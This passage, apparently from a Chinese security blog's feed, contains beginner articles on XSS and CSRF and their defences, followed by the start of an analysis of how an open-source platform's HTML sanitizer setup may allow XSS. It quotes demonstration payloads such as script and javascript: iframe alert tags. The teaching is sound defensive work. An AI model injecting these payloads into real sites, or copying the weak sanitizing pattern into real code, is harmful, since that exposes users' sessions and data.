0–120。</p>\n</li>\n<li>\n<p>像上述所說明的任何輸入和其他難以定義文法的自由格式，都應該要經過編碼成為純字符串來處理，防止內容被當作程式碼執行，許多程式框架都有提供內建的編碼函式庫，可以依自己的慣用語言程式查找並多加利用。</p>\n</li>\n<li>\n<p>絕對不要將使用者的輸入放入 註解、屬性名稱、標籤名稱 等，因為這些位置都能將字符串作為程式碼運行<br>\n另外，於伺服器上可作以下設定增強<strong>瀏覽器</strong>的防護：<br>\n•對 cookie 設定 HttpOnly 的屬性，確保程式碼沒有存取權<br>\n•設定內容安全策略（CSP）的標頭，明確定義允許瀏覽器在該頁面上加載的內容來源，涵蓋的類型包括 JavaScriptCSS、HTML框架、字體、圖片和可嵌入對象，例如 Java applet、ActiveX等。</p>\n</li>\n</ol>\n<h2 id=\"%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B\"><a class=\"direct-link\" href=\"#%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B\">#</a> 名詞解釋</h2>\n<p><strong>註1</strong>：Browser Render：瀏覽器渲染（ browser render ）是將 URL 對應的各種資源，通過瀏覽器的渲染引擎進行解析，輸出視覺化的影象，渲染引擎包括像是 HTML 直譯器、佈局（ layout ）、CSS 直譯器和 JavaScript 引擎。</p>\n<p><strong>註2</strong>：HTML Encoder：這是為了避免特殊符號造成的顯示問題，以及避免HTML 將 URL 中的特殊符號視為語法而產生的編碼，範例如下：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">&lt;script>alert(1);&lt;/script> </code></pre>\n<p>會被轉換成</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E</code></pre>\n<p>但在這裡 Hacker 會反其道而行故意將要輸入在 URL 的特殊符號先轉換成 HTML Encoder 輸入，讓 WebSever 解析成特殊符號，進而進行 XSS 攻擊。</p>\n<p><strong>註3</strong>：DOM：DOM 全名為 Document Object Model，是用來描述 HTML 文件的表示法，可以使用 JavaScript 來動態產生完整的網頁，而不必透過伺服器，簡單來說就是把一份 HTML 文件中的各種標籤及文字、圖片等，都定義成一個個網頁物件，而這些物件最終會成為一個樹狀結構，範例如下：</p>\n<p><img src=\"/img/posts/jo/zerobased-cross-site-scripting/p3.png\" alt=\"\"></p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>講完了 CSRF 和 XSS 這對兄弟，接著下一篇會說明網頁安全三本柱 Secure 、 samsite 、 Httponly 他們之間不得不說的故事，再之後會提到關於內容安全策略（CSP）和跨域資源共用（CORS）與網頁安全的關係。</p>\n<h2 id=\"%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\"><a class=\"direct-link\" href=\"#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\">#</a> 延伸閱讀</h2>\n<h3 id=\"%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89--%E8%AA%8D%E8%AD%98-csrf%EF%BC%88cross-site-request-forgery%EF%BC%89\"><a class=\"direct-link\" href=\"#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%B8%80%EF%BC%89--%E8%AA%8D%E8%AD%98-csrf%EF%BC%88cross-site-request-forgery%EF%BC%89\">#</a> 零基礎資安系列（一）- 認識 CSRF（Cross Site Request Forgery）</h3>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-request-forgery\">認識 CSRF(Cross Site Request Forgery )</a></p>\n</blockquote>\n",
      "date_published": "2021-05-27T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/jo/zerobased-cross-site-request-forgery/",
      "url": "https://tech-blog.cymetrics.io/posts/jo/zerobased-cross-site-request-forgery/",
      "title": "零基礎資安系列（一）-認識 CSRF（Cross Site Request Forgery）",
      "content_html": "<!-- summary -->\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<blockquote>\n<p>陌生人＝ <strong>Hacker</strong> 菜單 ＝ <strong>Request</strong><br>\n桌號＝ <strong>cookie 註1</strong> 老闆＝ <strong>web server</strong> 你 ＝ <strong>User</strong></p>\n<p>想像你到一家餐廳吃飯，陌生人拿了一張有你桌號的菜單點餐之後給老闆，結果老闆問也不問便收了菜單並將帳記到了你的身上，這就是 CSRF 的基礎概念。</p>\n</blockquote>\n<!-- summary -->\n<h2 id=\"%E9%87%8B%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E9%87%8B%E4%BE%8B\">#</a> 釋例</h2>\n<p>CSRF ( Cross Site Request Forgery )，翻成中文叫做<strong>跨站請求偽造</strong>，其實字面上把他猜成拆開成請求偽造和跨站之後就蠻好理解的，怎麼說呢？ 我以前言的例子來說明一下<strong>跨站請求偽造是怎麼一回事</strong></p>\n<p>先講請求偽造，請求偽造的意思很好理解，指的是陌生人拿了一張有你桌號的菜單點自己想點的餐之後給老闆這件事（ Hacker 用帶著你 cookie 的 Request 送給 web server ），那至於跨站跨在哪裡呢？</p>\n<p>跨在陌生人在你不知情的情況下把有你桌號的菜單送給了老闆，所以跨過了本該知情的你（送出的人不同，所以送出 Request 的 Domain 註2) 也會不同），CSRF 的本質在於 web server 無條件信任 cookie 而沒有再確認或以其他方式驗證（ 等於老闆問也不問無條件相信菜單上的桌號，也不看是誰送的），因此只能保證這個Request 發自某個 User ，卻不能保證請求本身是 User 自願發出的（ 等於菜單上的桌號是你的，但不代表這個菜是你點的 ）。</p>\n<h2 id=\"csrf-%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B\"><a class=\"direct-link\" href=\"#csrf-%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B\">#</a> CSRF 攻擊流程</h2>\n<p>用簡單的圖帶你看一下 Hacker 的犯案過程</p>\n<p><img src=\"/img/posts/jo/zerobased-cross-site-request-forgery/p1.png\" alt=\"\"></p>\n<ol>\n<li>User 訪問並登入 A 網站</li>\n<li>User 獲得 Cookie 並存至 User 瀏覽器</li>\n<li>User 在未登出 A 網站的情況下瀏覽 B 網站，接著 Hacker 以 B 網站的 Domain 以 A 網站給 User 的 Cookie 對 A 網站發送請求，如果 A 網站沒發現的話就 GG 了。</li>\n</ol>\n<p>＊Ｂ網站會在自身的網站中加入含 A 網站 Domain 的 Javascript ，例如：上方圖中的 <strong>A/pay?to=B</strong> ，這裡的 A 就是指 A 網站 Domain ，然後去執行 Pay 這個動作給 B ，這個攻擊的破綻就是剛剛前言例子中提到的，送出資料的Domain 不同，另外，貼心小提醒，在惡意網站中就算只是滑鼠移過圖片也可能會執行惡意的 Javascript 千萬不要覺得我都不點就沒事。</p>\n<p>通常 Hacker 發現網站有漏洞時，都會以金流及竊取隱私資料為主要攻擊面向，畢竟 Hacker 除了做興趣也是要吃飯，因此當網站在設計關於金流及隱私資料的架構時需要特別小心，</p>\n<h2 id=\"hacker%E5%AF%A6%E9%9A%9B%E5%88%A9%E7%94%A8csrf%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B\"><a class=\"direct-link\" href=\"#hacker%E5%AF%A6%E9%9A%9B%E5%88%A9%E7%94%A8csrf%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B\">#</a> Hacker實際利用CSRF漏洞案例</h2>\n<p><img src=\"/img/posts/jo/zerobased-cross-site-request-forgery/p2.png\" alt=\"\"><br>\n<strong>photo by <a href=\"https://www.ithome.com.tw/news/139205\">https://www.ithome.com.tw/news/139205</a></strong></p>\n<p>這個新聞是經典的 XSS 與 CSRF 聯動的漏洞， Hacker 在注入 XSS 之後，只要造訪被注入 XSS 頁面的是主辦單位， Hacker 可利用 CSRF 漏洞把自己的角色變更為協辦單位，而獲得可以存取社團所有功能的權限，包括利用程式變更主辦單位 PayPal 帳號的電子郵件，這表示之後這個社團舉辦的各種活動所收取的款項，都會流落到 Hacker 所指定的帳號中，而且因為電子郵件被變更，所以主辦單位也不會收到任何的郵件通知。</p>\n<p>＊如果是對 XSS 不了解的朋友，歡迎看我的第二篇文章喔 XD</p>\n<h3 id=\"%E9%81%94%E6%88%90-csrf-%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B%E4%B8%89%E8%A6%81%E7%B4%A0\"><a class=\"direct-link\" href=\"#%E9%81%94%E6%88%90-csrf-%E6%94%BB%E6%93%8A%E6%B5%81%E7%A8%8B%E4%B8%89%E8%A6%81%E7%B4%A0\">#</a> 達成 CSRF 攻擊流程三要素</h3>\n<ol>\n<li>有一個可以觸發惡意腳本的動作</li>\n<li>只以單一條件驗證網站身份，例如：只驗證 cookie 或 token</li>\n<li>沒有驗證或是驗證的參數可以預測（固定的 cookie ）</li>\n</ol>\n<h2 id=\"%E5%A6%82%E4%BD%95%E9%98%B2%E7%AF%84-csrf\"><a class=\"direct-link\" href=\"#%E5%A6%82%E4%BD%95%E9%98%B2%E7%AF%84-csrf\">#</a> 如何防範 CSRF</h2>\n<p>防範 CSRF 的重點在於打破 CSRF 攻擊流程三要素，</p>\n<ol>\n<li>增加所有敏感動作的驗證方式，例如：金流、提交個資 等…多加一道驗證碼的機制</li>\n<li>增加無法預測的參數，常見且有效的防範方式例如：<strong>CSRF token (在頁面的 form 或是 custom header 裡面放一個 token 並要求 client request 要夾帶這個 token )</strong></li>\n</ol>\n<h2 id=\"%E5%AF%A6%E4%BD%9C-csrf-token-%E9%82%8F%E8%BC%AF\"><a class=\"direct-link\" href=\"#%E5%AF%A6%E4%BD%9C-csrf-token-%E9%82%8F%E8%BC%AF\">#</a> 實作 CSRF Token 邏輯</h2>\n<p><strong>建立</strong>：在 User 打開網頁時，Server 會根據 User 的身份生成一個 Token ，將 Token 存放在頁面中（通常生成的基礎是 User 名稱加上隨機亂數或是時間戳記的加密組合，另外需要注意的是 Token 需要額外放置，不能依然存放在 Cookie 中，不然一樣會被整包帶走 ，建議是存在 Server 的 Session中）。</p>\n<p><strong>傳送請求</strong>：之後只要有添加 Token 的頁面在提交請求時，都需要加上這個Token ，請求才會被允許，通常對於GET請求，Token會附在請求的網址之後，這樣 URL 會變成   <code>http://url?csrftoken=tokenvalue</code>而 POST 請求則會在 form 的最後加上：</p>\n<pre class=\"language-txt\"><code class=\"language-txt\">&lt;input type=「hidden」 name=「csrftoken」 value=「tokenvalue」/>`</code></pre>\n<p>把Token以參數的形式加入請求了。</p>\n<p><strong>驗證</strong>：當 User 發送當有請求的 Token 給 Server 時，Server 為了要確定 Token 的時間有效性和正確性，會先解密 Token，對比加密過後的 User 名稱和當時的隨機亂數及時間戳記，如果加密的資料一致而且時間戳記沒有過期，Server 就會驗證通過，確認 Token 是有效的。</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> 總結</h2>\n<p>除了加上 CSRF Token 及多重驗證的防範方式以外，為避免 CSRF 風險，建議在每階段架構和設計時，使用經過審查的套件或框架。 使用諸如 owasp csrfguard 之類的反 CSRF 套件可以降低網頁 CSRF 的風險。</p>\n<p>之後會再另開文章說明 CSRF 的兄弟 XSS 與網頁安全三本柱 Secure 、 samsite 、 httponly 他們之間不得不說的故事。</p>\n<h2 id=\"%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B\"><a class=\"direct-link\" href=\"#%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B\">#</a> 名詞解釋</h2>\n<p><strong>註1</strong>：cookie：用來記錄User在網站上的操作及憑證，大多數電商網站，如PChome等都會使用 cookie 來紀錄網頁上的的操作資訊，常見的是紀錄購物車、會員登入或瀏覽紀錄、停留時間等，讓Web可以識別用戶的身分，User登入過後，可以無需再次登入就可以直接進行操作，。</p>\n<p><strong>註2</strong>：domain：指的是網域名稱，簡單來說就是網站的地址，就如同住家地址一般，寄信的時候可以讓對方知道信是從哪裡寄來的。</p>\n<p>熱騰騰的XSS文章出爐啦～</p>\n<h2 id=\"%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\"><a class=\"direct-link\" href=\"#%E5%BB%B6%E4%BC%B8%E9%96%B1%E8%AE%80\">#</a> 延伸閱讀</h2>\n<h3 id=\"%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89-%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89\"><a class=\"direct-link\" href=\"#%E9%9B%B6%E5%9F%BA%E7%A4%8E%E8%B3%87%E5%AE%89%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89-%E8%AA%8D%E8%AD%98-xss%EF%BC%88cross-site-scripting%EF%BC%89\">#</a> 零基礎資安系列（二）-認識 XSS（Cross-Site Scripting）</h3>\n<blockquote>\n<p><a href=\"https://tech-blog.cymetrics.io/jo/zerobased-cross-site-scripting\">認識 XSS(Cross-Site Scripting</a></p>\n</blockquote>\n<h2 id=\"%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\">#</a> 參考資料</h2>\n<blockquote>\n<p><a href=\"https://blog.techbridge.cc/2017/02/25/csrf-introduction/\">https://blog.techbridge.cc/2017/02/25/csrf-introduction/</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://kknews.cc/zh-tw/tech/veqpbna.html\">https://kknews.cc/zh-tw/tech/veqpbna.html</a></p>\n</blockquote>\n<blockquote>\n<p><a href=\"https://zh.wikipedia.org/wiki/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0\">https://zh.wikipedia.org/wiki/跨站請求偽造</a></p>\n</blockquote>\n",
      "date_published": "2021-05-26T00:00:00-00:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/huli/prevent-xss-might-be-harder-than-you-thought/",
      "url": "https://tech-blog.cymetrics.io/posts/huli/prevent-xss-might-be-harder-than-you-thought/",
      "title": "防止 XSS 可能比想像中困難",
      "content_html": "<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> 前言</h2>\n<p>如果你不知道什麼是 XSS（Cross-site Scripting），簡單來說就是駭客可以在你的網站上面執行 JavaScript 的程式碼。既然可以執行，那就有可能可以把使用者的 token 偷走，假造使用者的身份登入，就算偷不走 token，也可以竄改頁面內容，或是把使用者導到釣魚網站等等。</p>\n<p>要防止 XSS，就必須阻止駭客在網站上面執行程式碼，而防禦的方式有很多，例如說可以透過 CSP（Content-Security-Policy）這個 HTTP response header 防止 inline script 的執行或是限制可以載入 script 的 domain，也可以用 <a href=\"https://web.dev/trusted-types/\">Trusted Types</a> 防止一些潛在的攻擊以及指定規則，或是使用一些過濾 XSS 的 library，例如說 <a href=\"https://github.com/cure53/DOMPurify\">DOMPurify</a> 以及 <a href=\"https://github.com/leizongmin/js-xss\">js-xss</a>。</p>\n<p>但是用了這些就能沒事了嗎？是也不是。</p>\n<p>如果使用正確那當然沒有問題，但若是有用可是設定錯誤的話，還是有可能存在 XSS 的漏洞。</p>\n<!-- summary -->\n<p>前陣子我剛從公司內轉到一個做資安的團隊 <a href=\"https://cymetrics.io/zh-tw\">Cymetrics</a>，在對一些網站做研究的時候發現了一個現成的案例，因此這篇就以這個現成的案例來說明怎樣叫做錯誤的設定，而這個設定又會帶來什麼樣的影響。</p>\n<!-- summary -->\n<h2 id=\"%E9%8C%AF%E8%AA%A4%E7%9A%84%E8%A8%AD%E5%AE%9A%EF%BC%8C%E6%84%8F%E6%96%99%E4%B9%8B%E5%A4%96%E7%9A%84%E7%B5%90%E6%9E%9C\"><a class=\"direct-link\" href=\"#%E9%8C%AF%E8%AA%A4%E7%9A%84%E8%A8%AD%E5%AE%9A%EF%BC%8C%E6%84%8F%E6%96%99%E4%B9%8B%E5%A4%96%E7%9A%84%E7%B5%90%E6%9E%9C\">#</a> 錯誤的設定，意料之外的結果</h2>\n<p><a href=\"https://matters.news/\">Matters News</a> 是一個去中心化的寫作社群平台，而且所有的程式碼都有<a href=\"https://github.com/thematters\">開源</a>！</p>\n<p>像是這種部落格平台，我最喜歡看的是他們怎麼處理內容的過濾，秉持著好奇跟研究的心態，可以來看看他們在文章跟評論的部分是怎麼做的。</p>\n<p>Server 過濾的程式碼在這邊：<a href=\"https://github.com/thematters/matters-server/blob/bf49f129eb63acaab707609f6a12fced7aaf0f4c/src/common/utils/xss.ts\">matters-server/src/common/utils/xss.ts</a>：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">import</span> xss <span class=\"token keyword\">from</span> <span class=\"token string\">'xss'</span><br><br><span class=\"token keyword\">const</span> <span class=\"token constant\">CUSTOM_WHITE_LISTS</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  a<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span><span class=\"token punctuation\">(</span>xss<span class=\"token punctuation\">.</span>whiteList<span class=\"token punctuation\">.</span>a <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'class'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figure<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figcaption<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  source<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  iframe<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'frameborder'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'allowfullscreen'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sandbox'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">onIgnoreTagAttr</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">tag<span class=\"token operator\">:</span> string<span class=\"token punctuation\">,</span> name<span class=\"token operator\">:</span> string<span class=\"token punctuation\">,</span> value<span class=\"token operator\">:</span> string</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token comment\">/**<br>   * Allow attributes of whitelist tags start with \"data-\" or \"class\"<br>   *<br>   * @see https://github.com/leizongmin/js-xss#allow-attributes-of-whitelist-tags-start-with-data-<br>   */</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">.</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token string\">'data-'</span> <span class=\"token operator\">||</span> name<span class=\"token punctuation\">.</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">===</span> <span class=\"token string\">'class'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token comment\">// escape its value using built-in escapeAttrValue function</span><br>    <span class=\"token keyword\">return</span> name <span class=\"token operator\">+</span> <span class=\"token string\">'=\"'</span> <span class=\"token operator\">+</span> xss<span class=\"token punctuation\">.</span><span class=\"token function\">escapeAttrValue</span><span class=\"token punctuation\">(</span>value<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'\"'</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">const</span> <span class=\"token function-variable function\">ignoreTagProcessor</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><br>  <span class=\"token parameter\">tag<span class=\"token operator\">:</span> string<span class=\"token punctuation\">,</span><br>  html<span class=\"token operator\">:</span> string<span class=\"token punctuation\">,</span><br>  options<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token punctuation\">[</span>key<span class=\"token operator\">:</span> string<span class=\"token punctuation\">]</span><span class=\"token operator\">:</span> any <span class=\"token punctuation\">}</span></span><br><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>tag <span class=\"token operator\">===</span> <span class=\"token string\">'input'</span> <span class=\"token operator\">||</span> tag <span class=\"token operator\">===</span> <span class=\"token string\">'textarea'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span><br>    <span class=\"token keyword\">return</span> <span class=\"token string\">''</span><br>  <span class=\"token punctuation\">}</span><br><span class=\"token punctuation\">}</span><br><br><span class=\"token keyword\">const</span> xssOptions <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  whiteList<span class=\"token operator\">:</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span>xss<span class=\"token punctuation\">.</span>whiteList<span class=\"token punctuation\">,</span> <span class=\"token operator\">...</span><span class=\"token constant\">CUSTOM_WHITE_LISTS</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span><br>  onIgnoreTagAttr<span class=\"token punctuation\">,</span><br>  onIgnoreTag<span class=\"token operator\">:</span> ignoreTagProcessor<span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">}</span><br><span class=\"token keyword\">const</span> customXSS <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">xss<span class=\"token punctuation\">.</span>FilterXSS</span><span class=\"token punctuation\">(</span>xssOptions<span class=\"token punctuation\">)</span><br><br><span class=\"token keyword\">export</span> <span class=\"token keyword\">const</span> <span class=\"token function-variable function\">sanitize</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">string<span class=\"token operator\">:</span> string</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> customXSS<span class=\"token punctuation\">.</span><span class=\"token function\">process</span><span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">)</span></code></pre>\n<p>這邊比較值得注意的是這一段：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">const</span> <span class=\"token constant\">CUSTOM_WHITE_LISTS</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span><br>  a<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span><span class=\"token punctuation\">(</span>xss<span class=\"token punctuation\">.</span>whiteList<span class=\"token punctuation\">.</span>a <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'class'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figure<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  figcaption<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  source<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'type'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br>  iframe<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'src'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'frameborder'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'allowfullscreen'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'sandbox'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><br><span class=\"token punctuation\">}</span></code></pre>\n<p>這一段就是允許被使用的 tag 跟屬性，而屬性的內容也會被過濾。例如說雖然允許 iframe 跟 src 屬性，但是 <code>&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;</code> 是行不通的，因為這種 <code>javascript:</code> 開頭的 src 會被過濾掉。</p>\n<p>只看 server side 的沒有用，還需要看 client side 那邊是怎麼 render 的。</p>\n<p>對於文章的顯示是這樣的：<a href=\"https://github.com/thematters/matters-web/blob/0349fd87cc4737ff9509ec5eae2c2d4bda9de057/src/views/ArticleDetail/Content/index.tsx\">src/views/ArticleDetail/Content/index.tsx</a>）</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token operator\">&lt;</span><span class=\"token operator\">></span><br>  <span class=\"token operator\">&lt;</span>div<br>    className<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token function\">classNames</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> <span class=\"token string\">'u-content'</span><span class=\"token operator\">:</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">,</span> translating <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><br>    dangerouslySetInnerHTML<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span><br>      __html<span class=\"token operator\">:</span> <span class=\"token function\">optimizeEmbed</span><span class=\"token punctuation\">(</span>translation <span class=\"token operator\">||</span> article<span class=\"token punctuation\">.</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><br>    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><br>    onClick<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>captureClicks<span class=\"token punctuation\">}</span><br>    ref<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>contentContainer<span class=\"token punctuation\">}</span><br>  <span class=\"token operator\">/</span><span class=\"token operator\">></span><br><br>  <span class=\"token operator\">&lt;</span>style jsx<span class=\"token operator\">></span><span class=\"token punctuation\">{</span>styles<span class=\"token punctuation\">}</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>style<span class=\"token operator\">></span><br><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span><span class=\"token operator\">></span></code></pre>\n<p>Matters 的前端使用的是 React，在 React 裡面所 render 的東西預設都已經 escape 過了，所以基本上不會有 XSS 的洞。但有時候我們不想要它過濾，例如說文章內容，我們可能會需要一些 tag 可以 render 成 HTML，這時候就可以用 <code>dangerouslySetInnerHTML</code>，傳入這個的東西會直接以 innerHTML 的方式 render 出來，不會被過濾。</p>\n<p>所以一般來說都會採用 js-xss + dangerouslySetInnerHTML 這樣的做法，確保 render 的內容儘管是 HTML，但不會被 XSS。</p>\n<p>這邊在傳入 dangerouslySetInnerHTML 之前先過了一個叫做 optimizeEmbed 的函式，可以繼續往下追，看到 <a href=\"https://github.com/thematters/matters-web/blob/0349fd87cc4737ff9509ec5eae2c2d4bda9de057/src/common/utils/text.ts#L89\">src/common/utils/text.ts</a>：</p>\n<pre class=\"language-js\"><code class=\"language-js\"><span class=\"token keyword\">export</span> <span class=\"token keyword\">const</span> <span class=\"token function-variable function\">optimizeEmbed</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">content<span class=\"token operator\">:</span> string</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>  <span class=\"token keyword\">return</span> content<br>    <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">\\&lt;iframe </span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span> <span class=\"token string\">'&lt;iframe loading=\"lazy\"'</span><span class=\"token punctuation\">)</span><br>    <span class=\"token punctuation\">.</span><span class=\"token function\">replace</span><span class=\"token punctuation\">(</span><br>      <span class=\"token regex\"><span class=\"token regex-delimiter\">/</span><span class=\"token regex-source language-regex\">&lt;img\\s[^>]*?src\\s*=\\s*['\\\"]([^'\\\"]*?)['\\\"][^>]*?></span><span class=\"token regex-delimiter\">/</span><span class=\"token regex-flags\">g</span></span><span class=\"token punctuation\">,</span><br>      <span class=\"token punctuation\">(</span><span class=\"token parameter\">match<span class=\"token punctuation\">,</span> src<span class=\"token punctuation\">,</span> offset</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">{</span><br>        <span class=\"token keyword\">return</span> <span class=\"token comment\">/* html */</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\"><br>      &lt;picture><br>        &lt;source<br>          type=\"image/webp\"<br>          media=\"(min-width: 768px)\"<br>          srcSet=</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">${</span><span class=\"token function\">toSizedImageURL</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">{</span> url<span class=\"token operator\">:</span> src<span class=\"token punctuation\">,</span> size<span class=\"token operator\">:</span> <span class=\"token string\">'1080w'</span><span class=\"token punctuation\">,</span> ext<span class=\"token operator\">:</span> <span class=\"token string\">'webp'</span> <span class=\"token 